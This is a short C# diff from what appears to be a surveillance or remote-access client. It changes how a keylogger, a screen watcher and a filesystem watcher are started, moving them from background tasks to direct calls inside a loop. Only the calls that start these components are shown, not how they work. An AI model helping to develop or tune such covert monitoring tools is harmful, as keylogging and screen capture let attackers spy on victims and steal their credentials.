@@ -46,11 +46,11 @@ namespace Client
 
             /// Start loggers.
             
-            Task.Factory.StartNew(()=>Armitage.Watchers.Keylogger.Start());
+            Armitage.Watchers.Keylogger.Start();
 
-            Task.Factory.StartNew(() => Armitage.Watchers.Screen_Watcher.Start());
+            Armitage.Watchers.Screen_Watcher.Start();
 
-            Task.Factory.StartNew(() => Armitage.Watchers.Filesystem.Start());
+            Armitage.Watchers.Filesystem.Start();
 
             while (true)
             {
